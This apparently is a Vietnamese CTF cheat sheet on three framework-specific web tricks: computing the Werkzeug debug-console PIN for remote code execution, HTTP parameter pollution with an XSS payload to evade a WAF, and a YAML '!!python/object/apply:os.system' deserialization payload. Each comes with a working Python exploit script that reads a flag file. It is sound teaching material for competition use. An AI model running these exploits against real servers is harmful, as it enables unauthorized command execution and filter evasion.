# Mẹo vặt theo ngôn ngữ/framework (Lang/Framework Tricks)

Đây là tuyển tập các "mẹo vặt" chỉ đúng với 1 ngôn ngữ hoặc 1 framework cụ thể (ví dụ Flask của Python, hay cách đọc file cấu hình YAML), không thuộc nhóm lỗ hổng lớn nào riêng như SQLi/XSS. Ví dụ: cùng 1 trang web, nếu viết bằng Flask thì có 1 kiểu lỗi đặc trưng của Flask (không gặp ở framework khác); cùng 1 việc "đọc tham số trùng tên", mỗi framework lại xử lý khác nhau — những chuyện nhỏ vậy nhưng biết đúng mẹo thì khai thác được ngay, không biết thì bó tay dù đã thử hết các lỗ hổng "chuẩn".

Trên Burp bạn nhận ra các mẹo này khi: thấy trang lỗi 500 có kiểu trình bày đặc trưng của Flask/Werkzeug (traceback nhiều dòng, có icon terminal nhỏ) — đây là dấu hiệu của mẹo 1 (Werkzeug Debug Console); hoặc thấy app chấp nhận gửi 1 tham số nhiều lần (`?id=1&id=2`) mà không rõ xử lý ra sao — đây là mẹo 2 (HTTP Parameter Pollution).

## Mẹo 1 — Werkzeug Debug Console (RCE có sẵn trong Flask khi quên tắt debug)

Flask (framework Python hay dùng) có 1 chế độ "debug" dành cho lúc code, nếu lỗi xảy ra sẽ hiện ngay 1 ô console Python để dev gõ lệnh sửa lỗi tại chỗ — tiện cho dev nhưng nếu quên tắt khi đưa lên server thật, BẤT KỲ AI ghé vào cũng mở được console đó và chạy lệnh tuỳ ý trên server. Console này được bảo vệ bằng 1 mã PIN, nhưng PIN không phải ngẫu nhiên — nó được TÍNH ra từ vài thông tin của máy chủ (tên user chạy app, địa chỉ MAC, 1 mã máy riêng), và công thức tính PIN này công khai trong mã nguồn Werkzeug — nếu bạn biết đủ các thông tin đó, bạn tính RA ĐƯỢC chính xác PIN.

```python
import hashlib
from itertools import chain
import re
import requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")

def tinh_pin(username, modname, app_name, moddir, uuidnode, machine_id):
    # Công thức này lấy theo đúng mã nguồn công khai của Werkzeug (werkzeug/debug/__init__.py)
    probably_public_bits = [username, modname, app_name, moddir]
    private_bits = [str(uuidnode), machine_id]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    num = "%09d" % (int(h.hexdigest(), 16) % 1000000000)
    return num[:3] + "-" + num[3:6] + "-" + num[6:]


def mo_console_va_chay_lenh(session, base_url, pin, lenh):
    session.get(f"{base_url}/console", timeout=5)
    r = session.post(
        f"{base_url}/console",
        data={"pin": pin, "cmd": lenh},
        timeout=5,
    )
    return r.text


def solve_one(session, base_url):
    # Thường cần kết hợp với 1 lỗ hổng khác (LFI) để đọc được machine_id/MAC thật.
    # Nếu đã có đủ thông tin, điền vào đây rồi tính PIN:
    pin = tinh_pin(
        username="www-data",
        modname="flask.app",
        app_name="Flask",
        moddir="/app/app.py",
        uuidnode=123456789012,   # điền MAC thật dạng số nếu biết, hoặc brute-force
        machine_id="docker-machine-id-doc-duoc-qua-LFI",
    )
    out = mo_console_va_chay_lenh(session, base_url, pin, "__import__('os').popen('cat flag.txt').read()")
    m = FLAG_RE.search(out)
    return m.group(0) if m else None
```

## Mẹo 2 — HTTP Parameter Pollution (gửi trùng tên tham số để lừa 2 lớp hiểu khác nhau)

Nếu bạn gửi `?id=1&id=2` (2 tham số cùng tên `id`), các hệ thống khác nhau xử lý khác nhau: có hệ thống lấy giá trị ĐẦU, có hệ thống lấy giá trị CUỐI, có hệ thống ghép thành 1 danh sách. Mẹo ở đây là: nếu WAF (lớp lọc) chỉ kiểm tra giá trị ĐẦU còn app thật lại dùng giá trị CUỐI, bạn đặt giá trị an toàn ở đầu (để WAF yên tâm cho qua) và giá trị payload thật ở cuối (app vẫn nhận đúng payload).

```python
import requests

def thu_hpp(session, base_url, param_name, gia_tri_an_toan, payload_thuc):
    # Gửi tham số trùng tên 2 lần: giá trị an toàn trước, payload thật sau
    # requests cho phép truyền list cho 1 key trong params để tạo tham số trùng tên
    r = session.get(
        f"{base_url}/search",
        params={param_name: [gia_tri_an_toan, payload_thuc]},
        timeout=5,
    )
    return r


def solve_one(session, base_url):
    r = thu_hpp(session, base_url, "q", "laptop", "<script>alert(1)</script>")
    print("status:", r.status_code)
    # Nếu status không phải 403 (không bị WAF chặn) VÀ response chứa payload thật
    # (nghĩa là app đã dùng giá trị CUỐI) -> HPP bypass WAF thành công
    if r.status_code != 403 and "<script>alert(1)</script>" in r.text:
        return True
    return False
```

## Mẹo 3 — YAML type confusion / RCE (khi app đọc config bằng YAML không an toàn)

YAML (1 định dạng cấu hình giống JSON nhưng linh hoạt hơn) có hỗ trợ thêm vài "ký hiệu đặc biệt" (tag) mà JSON không có. Nếu app dùng hàm đọc YAML kiểu KHÔNG AN TOÀN (`yaml.load()` thay vì `yaml.safe_load()`), 1 trong các tag đặc biệt đó cho phép gọi trực tiếp 1 hàm Python bất kỳ ngay khi app chỉ "đọc" file — không cần chạy gì thêm.

```python
import requests

def solve_one(session, base_url):
    # Payload YAML: nếu app dùng yaml.load() không an toàn, dòng này sẽ
    # CHẠY LUÔN os.system(...) ngay khi app parse (đọc) chuỗi YAML này
    payload_yaml = '!!python/object/apply:os.system ["cat flag.txt"]'

    r = session.post(
        f"{base_url}/upload-config",
        data=payload_yaml,
        headers={"Content-Type": "application/x-yaml"},
        timeout=5,
    )
    print(r.status_code, r.text[:300])
    return r.text if "FHACKER2026{" in r.text else None
```

## Giải thích cho người mới

- Mẹo 1 (Werkzeug PIN) là mẹo "đáng tiền" nhất trong 3 mẹo — nếu bạn thấy trang lỗi 500 kiểu Flask, LUÔN thử truy cập `/console` trước, vì đây là đường chạy lệnh trực tiếp trên server (RCE), nhanh hơn mọi cách khai thác khác nếu console còn mở.
- PIN không phải để brute-force 1 số 6 chữ số ngẫu nhiên — nó được TÍNH từ dữ liệu máy chủ thật. Nếu thiếu dữ liệu (ví dụ chưa có machine_id thật), bạn cần kết hợp với 1 lỗ hổng khác (ví dụ LFI — đọc file bất kỳ trên server) để lấy đủ input trước khi tính.
- Mẹo 2 (HPP) hoạt động vì 2 chương trình khác nhau (WAF và app thật) đọc "tham số trùng tên" theo 2 quy luật khác nhau — tương tự ý tưởng của WAF Bypass nhưng áp dụng riêng cho tình huống có tham số lặp tên, không phải đổi cách viết payload.
- Mẹo 3 (YAML) chỉ hoạt động nếu backend dùng đúng ngôn ngữ Python VÀ dùng hàm đọc không an toàn — nếu backend là Node.js hay ngôn ngữ khác, cú pháp RCE qua YAML sẽ khác hoàn toàn, không dùng được payload Python này.

## Lưu ý nhanh

- Werkzeug PIN: nếu tính ra sai, kiểm tra lại từng input — `machine_id` đôi khi phải lấy từ `/proc/self/cgroup` (ID container Docker) thay vì `/etc/machine-id` thật.
- HPP: nếu không thấy khác biệt gì, có thể app và WAF đang xử lý tham số trùng tên theo CÙNG 1 quy luật (không có bất đồng để lợi dụng) — thử tham số khác hoặc kết hợp thêm cách encode tên tham số.
- YAML: nếu không RCE được, kiểm tra xem app đã dùng đúng `safe_load()` (an toàn) chưa, hoặc dùng thư viện khác không hỗ trợ tag `!!python/object`.
- Cả 3 mẹo đều xuất phát từ 1 nguyên nhân chung: tính năng được thiết kế tiện cho LÚC DEV, nhưng nguy hiểm nếu đem thẳng lên server thật mà không tắt/siết lại.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
